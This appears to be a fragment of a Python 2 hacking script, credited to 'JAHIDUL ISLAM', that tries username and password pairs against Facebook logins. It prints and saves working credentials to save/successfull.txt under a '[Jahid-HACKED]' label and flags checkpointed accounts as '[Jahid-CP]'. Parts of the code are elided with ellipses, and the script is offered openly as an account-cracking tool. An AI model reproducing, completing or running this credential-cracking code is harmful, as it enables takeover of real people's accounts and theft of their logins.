#Tools Created By JAHIDUL ISLAM
...
\033[0;94m     __        _     _     _ 
\033[0;94m    \ \  __ _| |__ (_) __| |
\033[0;96m      \ \/ _` | '_ \| |/ _` |
\033[0;96m   /\_/ / (_| | | | | | (_| |
\033[0;96m  \___/ \__,_|_| |_|_|\__,_|
"""

print("\033[0;91mThis Tool's Free By JAHIDUL ISLAM")
...
def menu():
    ...
    print logo
    print ''
    print '\033[0;93mAUTHOR   : JAHIDUL ISLAM'
    print '\033[0;94mFACEBOOK : Jahidul Islam '
    print '\033[0;96mGITHUB   : Adriyanaditto543'
    print ''
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[Jahid-HACKED]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[Jahid-CP]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;92m \x1b[0m \n'
